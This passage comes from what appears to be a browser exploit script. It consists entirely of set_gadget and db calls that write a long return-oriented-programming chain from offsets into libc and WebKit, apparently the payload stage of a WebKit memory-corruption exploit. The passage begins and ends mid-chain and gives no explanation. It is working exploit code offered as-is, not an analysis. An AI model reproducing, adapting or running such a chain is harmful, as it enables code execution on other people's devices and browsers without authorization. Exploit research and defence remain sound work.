ropchain+164328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+164312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+164416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+164520, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+164552, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+164536, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+164648, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+164632, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+164784, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+164768, 
webkit_base+7438103, 
libc_base+206806, 
ropchain+128, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+164928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+164896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+164912, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+165016, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+165064, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+128, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+165136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+165216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+165272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+165400, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+165384, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+165496, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+165512, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+165624, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+165608, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
write_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+166952, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+167024, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+167112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+167144, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+167232, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+167248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+167368, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+167384, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+167352, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+167480, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+167496, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+167608, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+167592, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+167696, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+167680, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+167792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+167808, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+167920, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+167904, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+167992, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+168080, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+168112, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+168200, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+168216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+168368, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+168400, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+168384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+168352, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+168560, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+168528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+168512, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+168688, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+168704, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+168672, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+168800, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+168816, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+168928, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+168912, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+169016, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+169000, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+169112, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+169128, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+169240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+169224, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+169312, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+169400, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+169432, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+169520, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+169536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+169696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+169664, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+169648, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+169752, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+169856, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+169888, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+169872, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+170048, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+170016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+170000, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+170152, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+170136, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877546, 
libc_base+793877, 
ropchain+170360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+170328, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+170464, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+170448, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+170544, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+170648, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+170664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+170824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+170792, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+170776, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+170880, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+170984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+171016, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+171000, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+171176, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+171144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+171128, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+171280, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+171264, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+171480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+171448, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+171584, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+171568, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877568, 
libc_base+793877, 
ropchain+171696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+171664, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+171760, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+171816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877, 
ropchain+171960, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+171976, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+171944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+172136, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+172104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+172088, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+172264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+172280, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+172248, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+172376, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+172392, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+172504, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+172488, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+172592, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+172576, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+172688, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+172704, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+172816, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+172800, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+172888, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+172952, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+792472 
]);
db([4, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+173080, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+173200, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([61, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+173384, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+173488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+173504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+173656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+173688, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+173672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+173640, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+173784, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+173768, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+173888, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+175880, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+174024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+174040, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+174008, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+174144, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+174192, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
